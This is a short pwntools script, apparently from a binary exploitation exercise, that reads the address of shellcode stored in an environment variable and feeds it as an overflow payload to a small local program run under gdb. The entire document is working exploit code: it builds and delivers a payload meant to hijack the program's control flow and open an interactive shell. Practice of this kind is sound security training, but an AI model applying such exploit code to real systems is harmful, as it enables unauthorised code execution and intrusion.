from pwn import *
#Get SHELLCODE env
envp = process("./getenv")
shellcode_env = p32(int(envp.readline().strip(), 16))
envp.close()



print(hex(u32(shellcode_env)))
payload = b"A"*1 + shellcode_env
p = gdb.debug(["./smallbuff", payload], '''b * main''')
p.interactive()


